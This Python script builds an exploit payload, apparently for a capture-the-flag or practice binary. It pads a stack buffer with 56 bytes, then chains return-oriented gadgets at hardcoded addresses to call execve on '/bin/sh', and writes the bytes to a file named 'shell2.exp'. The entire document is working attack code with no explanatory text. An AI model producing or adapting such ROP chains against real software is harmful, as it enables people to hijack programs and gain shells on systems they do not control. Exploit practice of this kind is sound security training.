#!/usr/bin/env python3

from struct import *


if __name__ == '__main__':
	buf = b'A'*56
	buf += pack('<Q', 0x401163)  # pop rdi; pop rsi; ret;
	buf += pack('<Q', 0x404040)  # new rdi - pointer to "/bin/sh"
	buf += pack('<Q', 0x404048)  # new rsi - pointer to 0
	buf += pack('<Q', 0x401160)  # pop rdx ; pop rax; ret
	buf += pack('<Q', 0x404048)  # new rdx - pointer to 0
	buf += pack('<Q', 0x3b)      # new rax
	buf += pack('<Q', 0x40115e)  # syscall

	with open('shell2.exp', 'wb+') as f:
		f.write(buf)
